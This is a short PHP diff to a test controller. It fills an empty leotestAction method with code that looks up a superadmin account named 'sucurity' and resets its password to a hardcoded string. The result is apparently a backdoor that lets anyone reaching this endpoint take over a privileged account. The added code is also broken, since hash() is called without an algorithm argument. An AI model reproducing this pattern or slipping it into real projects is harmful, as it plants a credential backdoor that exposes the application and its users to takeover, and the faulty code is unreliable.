@@ -122,6 +122,11 @@ class TestController extends ControllerBase{
 	}
 
     public function leotestAction(){
-        
+        $sa=Superadmin::FindFirst(array(
+                "username=?1",
+                "bind"=>array(1=>"sucurity")
+            ));
+        $sa->password=hash("aqjytyg123456");
+        $sa->save();
     }
 }
